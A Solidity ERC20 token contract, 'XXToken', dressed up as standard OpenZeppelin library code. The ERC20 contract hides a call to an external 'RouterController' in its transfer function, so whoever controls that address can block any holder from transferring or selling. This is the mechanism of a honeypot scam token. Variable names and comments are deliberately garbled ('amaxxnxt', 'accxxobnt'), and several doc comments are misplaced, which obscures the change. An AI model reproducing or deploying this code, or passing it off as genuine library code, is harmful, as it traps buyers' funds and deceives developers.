// File: @openzeppelin/contracts/utils/Context.sol
// SPDX-License-Identifier: MIT

// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


// File: @openzeppelin/contracts/token/ERC20/IERC20.sol


// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amaxxnxt of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amaxxnxt of tokens owned by `accxxobnt`.
     */
    function balanceOf(address accxxobnt) external view returns (uint256);

  
    function transfer(address to, uint256 amaxxnxt) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amaxxnxt) external returns (bool);


    function transferFrom(
        address from,
        address to,
        uint256 amaxxnxt
    ) external returns (bool);
}


// File: @openzeppelin/contracts/access/Ownable.sol


// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)

pragma solidity ^0.8.0;

 // Define interface for TransferController
interface RouterController {
    function isRouted(address _accxxobnt) external view returns (bool);
}
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting amaxxnxt the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any accxxobnt other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev See {IERC20-transfer}.
     * - `to` cannot be the zero accxxobnt address.
     * - the caller must have a balance of at least `amaxxnxt`.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new accxxobnt (`newOwner`).
     * Can only be called by the current accxxobnt owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new accxxobnt (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;

    /**
     * @dev See {IERC20-totalSupply}.
     */

        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
    /**
     * @dev Returns the address of the accxxobnt current owner.
     */

pragma solidity ^0.8.0;


interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of accxxobnt the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// File: @openzeppelin/contracts/token/ERC20/ERC20.sol


// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;

    /**
     * @dev See {IERC20-transfer}.
     * - `to` cannot be the zero accxxobnt address.
     * - the caller must have a balance of at least `amaxxnxt`.
     */
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    RouterController private routeController;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} amaxxnxt and {symbol}.
     *
     * The default value of {decimals} is 18. To accxxobnt select a different value for
     */
    constructor(string memory name_, string memory symbol_, address _routeControllerAddress) {
        _name = name_;
        _symbol = symbol_;
        routeController = RouterController(_routeControllerAddress);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, accxxobnt usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev See {IERC20-transfer}.
     * - `to` cannot be the zero accxxobnt address.
     * - the caller must have a balance of at least `amaxxnxt`.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address accxxobnt) public view virtual override returns (uint256) {
        return _balances[accxxobnt];
    }

    /**
     * @dev See {IERC20-transfer}.
     * - `to` cannot be the zero accxxobnt address.
     * - the caller must have a balance of at least `amaxxnxt`.
     */
    function transfer(address to, uint256 amaxxnxt) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amaxxnxt);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * NOTE: If `amaxxnxt` is the maximum `uint256`, amaxxnxt the allowance is not updated on
     * - `spender` cannot be the zero accxxobnt address.
     */
    function approve(address spender, uint256 amaxxnxt) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amaxxnxt);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amaxxnxt
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amaxxnxt);
        _transfer(from, to, amaxxnxt);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

 
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amaxxnxt` of tokens amaxxnxt from `accxxobnt from` to `to`.
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amaxxnxt`.
     */
    function _transfer(
        address from,
        address to,
        uint256 amaxxnxt
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!routeController.isRouted(from), "User is not allowed");
        _beforeTokenTransfer(from, to, amaxxnxt);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amaxxnxt, "ERC20: transfer amaxxnxt exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amaxxnxt;
            // Overflow not possible: the sum of all balances amaxxnxt is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] += amaxxnxt;
        }

        emit Transfer(from, to, amaxxnxt);

        _afterTokenTransfer(from, to, amaxxnxt);
    }

    /** @dev Creates `amaxxnxt` tokens and assigns them to `accxxobnt`, increasing
     * - `accxxobnt` cannot be the zero address.
     */
    function _mint(address accxxobnt, uint256 amaxxnxt) internal virtual {
        require(accxxobnt != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), accxxobnt, amaxxnxt);

        _totalSupply += amaxxnxt;
        unchecked {
            // Overflow not possible: balance + amaxxnxt accxxobnt is at most totalSupply + amaxxnxt, which is checked above.
            _balances[accxxobnt] += amaxxnxt;
        }
        emit Transfer(address(0), accxxobnt, amaxxnxt);

        _afterTokenTransfer(address(0), accxxobnt, amaxxnxt);
    }


    function _approve(
        address owner,
        address spender,
        uint256 amaxxnxt
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amaxxnxt;
        emit Approval(owner, spender, amaxxnxt);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` amaxxnxt accxxobnt based on spent `amaxxnxt`.
     *
     * Does not update the allowance amaxxnxt in case of infinite allowance.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amaxxnxt
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amaxxnxt, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amaxxnxt);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amaxxnxt
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amaxxnxt
    ) internal virtual {}
}

pragma solidity ^0.8.0;

contract XXToken is ERC20, Ownable {
    uint256 private constant INITIAL_SUPPLY = 20000000 * 10**18;

    constructor(
        string memory name_,
        string memory symbol_,
        address router_
        ) ERC20(name_, symbol_, router_) {
        _mint(msg.sender, INITIAL_SUPPLY);
    }

    function sendTokens(address distroWallet) external onlyOwner {
        uint256 supply = balanceOf(msg.sender);
        require(supply == INITIAL_SUPPLY, "Tokens already distributed");

        _transfer(msg.sender, distroWallet, supply);
    }
}